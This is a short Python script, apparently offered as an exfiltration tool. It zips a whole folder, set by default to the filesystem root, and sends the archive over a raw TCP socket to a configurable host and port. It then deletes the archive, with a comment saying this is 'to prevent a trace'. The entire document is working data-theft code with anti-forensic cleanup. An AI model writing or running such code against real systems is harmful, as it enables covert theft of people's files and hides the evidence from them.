import os
import zipfile
import socket

HOST = '127.0.0.1' 
PORT = 1337  
FOLDER_PATH = '/'  # replace with the path of the folder you want to compress

# Create a zip file of that folder
zip_path = f'{FOLDER_PATH}.zip'
with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for root, dirs, files in os.walk(FOLDER_PATH):
        for file in files:
            file_path = os.path.join(root, file)
            zip_file.write(file_path, file)

# send them to the client socket
with open(zip_path, 'rb') as file:
    zip_bytes = file.read()
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((HOST, PORT))
    client_socket.sendall(zip_bytes)

# Remove the zip file to prevent a trace
os.remove(zip_path)
